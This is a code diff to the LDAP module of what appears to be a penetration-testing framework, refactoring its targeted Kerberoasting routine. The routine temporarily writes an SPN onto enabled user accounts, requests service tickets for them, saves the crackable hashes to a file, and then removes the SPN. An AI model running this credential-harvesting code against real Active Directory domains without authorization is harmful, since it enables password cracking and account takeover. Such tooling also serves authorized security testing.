@@ -968,9 +968,7 @@ class ldap(connection):
             self.roast_no_preauth()
             return
 
-        targeted = self.args.targeted_kerberoast
-
-        if targeted:
+        if self.args.targeted_kerberoast:
             target_users = []
             for item in self.args.targeted_kerberoast:
                 if os.path.isfile(item):
@@ -1010,9 +1008,8 @@ class ldap(connection):
             "pwdLastSet",
             "lastLogon",
             "objectClass",
+            "distinguishedName",
         ]
-        if targeted:
-            attributes.append("distinguishedName")
 
         resp = self.search(searchFilter, attributes, 0)
         resp_parsed = parse_result_attributes(resp)
@@ -1030,29 +1027,25 @@ class ldap(connection):
 
         enabled = [x for x in resp_parsed if not int(x["userAccountControl"]) & UF_ACCOUNTDISABLE]
 
-        if targeted:
+        if self.args.targeted_kerberoast:
             self.logger.success(f"Found {len(enabled)} enabled users without SPN.")
         else:
             self.logger.display(f"Total of records returned {len(enabled):d}")
 
         for user in enabled:
-            sam = user["sAMAccountName"]
-            downLevelLogonName = f"{self.targetDomain}\\{sam}"
             spn_added = False
 
-            if targeted:
-                dn = user["distinguishedName"]
-                spn = f"cifs/{sam}"
+            if self.args.targeted_kerberoast:
                 try:
-                    self.ldap_connection.modify(dn, {"servicePrincipalName": [(MODIFY_REPLACE, [spn])]})
-                    self.logger.debug(f"SPN '{spn}' added for {sam}")
+                    self.ldap_connection.modify(user["distinguishedName"], {"servicePrincipalName": [(MODIFY_REPLACE, [f"cifs/{user['sAMAccountName']}"])]})
+                    self.logger.debug(f"SPN 'cifs/{user['sAMAccountName']}' added for {user['sAMAccountName']}")
                     spn_added = True
                 except ldap_impacket.LDAPSessionError as e:
                     error_str = str(e)
                     if "insufficientAccessRights" in error_str or "INSUFF_ACCESS_RIGHTS" in error_str:
-                        self.logger.debug(f"No write access to {sam}'s SPN attribute")
+                        self.logger.fail(f"No write access to {user['sAMAccountName']}'s SPN attribute")
                     else:
-                        self.logger.fail(f"LDAP error for {sam}: {e}")
+                        self.logger.fail(f"LDAP error for {user['sAMAccountName']}: {e}")
                         self.logger.debug("Traceback", exc_info=True)
                     continue
 
@@ -1063,7 +1056,7 @@ class ldap(connection):
                     try:
                         principalName = Principal()
                         principalName.type = constants.PrincipalNameType.NT_MS_PRINCIPAL.value
-                        principalName.components = [downLevelLogonName]
+                        principalName.components = [f"{self.targetDomain}\\{user['sAMAccountName']}"]
 
                         tgs, cipher, oldSessionKey, sessionKey = getKerberosTGS(
                             principalName,
@@ -1077,30 +1070,30 @@ class ldap(connection):
                             tgs,
                             oldSessionKey,
                             sessionKey,
-                            sam,
-                            downLevelLogonName,
+                            user["sAMAccountName"],
+                            f"{self.targetDomain}\\{user['sAMAccountName']}",
                             is_computer="computer" in user.get("objectClass", [])
                         )
 
                         pwdLastSet = "<never>" if str(user.get("pwdLastSet", 0)) == "0" else str(datetime.fromtimestamp(self.getUnixTime(int(user["pwdLastSet"]))))
                         lastLogon = "<never>" if str(user.get("lastLogon", 0)) == "0" else str(datetime.fromtimestamp(self.getUnixTime(int(user["lastLogon"]))))
-                        self.logger.display(f"sAMAccountName: {sam}, memberOf: {user.get('memberOf', [])}, pwdLastSet: {pwdLastSet}, lastLogon: {lastLogon}")
+                        self.logger.display(f"sAMAccountName: {user['sAMAccountName']}, memberOf: {user.get('memberOf', [])}, pwdLastSet: {pwdLastSet}, lastLogon: {lastLogon}")
                         self.logger.highlight(f"{out}")
                         if self.args.kerberoasting:
-                            with open(self.args.kerberoasting, "a+", encoding="utf-8") as hash_kerberoasting:
+                            with open(self.args.kerberoasting, "a+") as hash_kerberoasting:
                                 hash_kerberoasting.write(out + "\n")
                     except Exception as e:
                         self.logger.debug(f"Exception: {e}", exc_info=True)
-                        self.logger.fail(f"Principal: {downLevelLogonName} - {e}")
+                        self.logger.fail(f"Principal: {self.targetDomain}\\{user['sAMAccountName']} - {e}")
                 else:
                     self.logger.fail(f"Error retrieving TGT for {self.domain}\\{self.username} from {self.kdcHost}")
             finally:
                 if spn_added:
                     try:
-                        self.ldap_connection.modify(dn, {"servicePrincipalName": [(MODIFY_REPLACE, [])]})
-                        self.logger.debug(f"SPN removed for {sam}")
+                        self.ldap_connection.modify(user["distinguishedName"], {"servicePrincipalName": [(MODIFY_REPLACE, [])]})
+                        self.logger.debug(f"SPN removed for {user['sAMAccountName']}")
                     except Exception as cleanup_error:
-                        self.logger.fail(f"Failed to remove SPN for {sam}: {cleanup_error}")
+                        self.logger.fail(f"Failed to remove SPN for {user['sAMAccountName']}: {cleanup_error}")
 
     def roast_no_preauth(self):
         usernames = []
@@ -1137,7 +1130,7 @@ class ldap(connection):
 
         for line in hashes:
             self.logger.highlight(line)
-            with open(self.args.kerberoasting, "a+", encoding="utf-8") as f:
+            with open(self.args.kerberoasting, "a+") as f:
                 f.write(line + "\n")
 
     def query(self):
